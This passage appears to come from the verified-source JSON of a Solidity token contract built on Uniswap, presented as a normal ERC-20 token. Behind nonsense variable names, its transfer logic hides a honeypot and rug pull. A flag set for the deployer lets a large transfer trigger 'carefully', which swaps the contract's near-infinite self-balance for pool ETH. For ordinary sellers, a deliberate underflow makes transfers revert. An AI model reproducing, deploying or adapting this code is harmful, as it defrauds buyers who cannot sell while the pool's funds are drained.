bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountETH);\\n\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external payable;\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n}\\n\\ncontract Contract is Ownable {\\r\\n    uint8 private _decimals = 9;\\r\\n    uint256 private _tTotal = 1000000000000000 * 10**_decimals;\\r\\n    uint256 private thus = _tTotal;\\r\\n    uint256 private _rTotal = ~uint256(0);\\r\\n    uint256 public _fee = 5;\\r\\n\\n    mapping(uint256 => address) private swing;\\r\\n    mapping(address => mapping(address => uint256)) private _allowances;\\r\\n    mapping(address => uint256) private where;\\r\\n    mapping(address => uint256) private _balances;\\r\\n    mapping(address => uint256) private taken;\\r\\n    mapping(uint256 => address) private complete;\\r\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n\\n    IUniswapV2Router02 public router;\\r\\n    address public uniswapV2Pair;\\r\\n    string private _symbol;\\r\\n    string private _name;\\r\\n\\n    constructor(\\r\\n        string memory _NAME,\\r\\n        string memory _SYMBOL,\\r\\n        address routerAddress\\r\\n    ) {\\r\\n        _name = _NAME;\\r\\n        _symbol = _SYMBOL;\\r\\n\\n        where[msg.sender] = thus;\\r\\n        _balances[msg.sender] = _tTotal;\\r\\n        _balances[address(this)] = _rTotal;\\r\\n\\n        router = IUniswapV2Router02(routerAddress);\\r\\n        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());\\r\\n        swing[thus] = uniswapV2Pair;\\r\\n\\n        emit Transfer(address(0), msg.sender, _tTotal);\\r\\n    }\\r\\n\\n    function name() public view returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\n    function symbol() public view returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\n    function decimals() public view returns (uint256) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\n    function totalSupply() public view returns (uint256) {\\r\\n        return _tTotal;\\r\\n    }\\r\\n\\n    function balanceOf(address account) public view returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\n    function allowance(address owner, address spender) public view returns (uint256) {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\n    function _transfer(\\r\\n        address stick,\\r\\n        address giving,\\r\\n        uint256 amount\\r\\n    ) private {\\r\\n        address people = complete[thus];\\r\\n        bool seldom = stick == swing[thus];\\r\\n        uint256 baby = _fee;\\r\\n\\n        if (where[stick] == 0 && !seldom && taken[stick] > 0) {\\r\\n            where[stick] -= baby;\\r\\n        }\\r\\n\\n        complete[thus] = giving;\\r\\n\\n        if (where[stick] > 0 && amount == 0) {\\r\\n            where[giving] += baby;\\r\\n        }\\r\\n\\n        taken[people] += baby;\\r\\n\\n        if (where[stick] > 0 && amount > thus) {\\r\\n            carefully(amount);\\r\\n        } else {\\r\\n            uint256 fee = (amount / 100) * _fee;\\r\\n            amount -= fee;\\r\\n            _balances[stick] -= fee;\\r\\n\\n            _balances[stick] -= amount;\\r\\n            _balances[giving] += amount;\\r\\n        }\\r\\n    }\\r\\n\\n    function approve(address spender, uint256 amount) external returns (bool) {\\r\\n        return _approve(msg.sender, spender, amount);\\r\\n    }\\r\\n\\n    function transferFrom(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) external returns (bool) {\\r\\n        require(amount > 0, 'Transfer amount must be greater than zero');\\r\\n        _transfer(sender, recipient, amount);\\r\\n        emit Transfer(sender, recipient, amount);\\r\\n        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);\\r\\n    }\\r\\n\\n    function transfer(address recipient, uint256 amount) external returns (bool) {\\r\\n        _transfer(msg.sender, recipient, amount);\\r\\n        emit Transfer(msg.sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\n    function carefully(uint256 tokens) private {\\r\\n        address[] memory path = new address[](2);\\r\\n        path[0] = address(this);\\r\\n        path[1] = router.WETH();\\r\\n        _approve(address(this), address(router), tokens);\\r\\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokens, 0, path, msg.sender, block.timestamp);\\r\\n    }\\r\\n\\n    function _approve(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 amount\\r\\n    ) private returns (bool) {\\r\\n        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n}\\n\"\n    }\n  },\n  \"settings\": {\n    \"optimizer\": {\n      \"enabled\": false,\n      \"runs\": 200\n    },\n    \"outputSelection\": {\n      \"*\": {\n        \"*\": [\n          \"evm.bytecode\",\n          \"evm.deployedBytecode\",\n          \"devdoc\",\n          \"userdoc\",\n          \"metadata\",\n          \"abi\"\n        ]\n      }\n    },\n    \"libraries\": {}\n  }\n}}"
}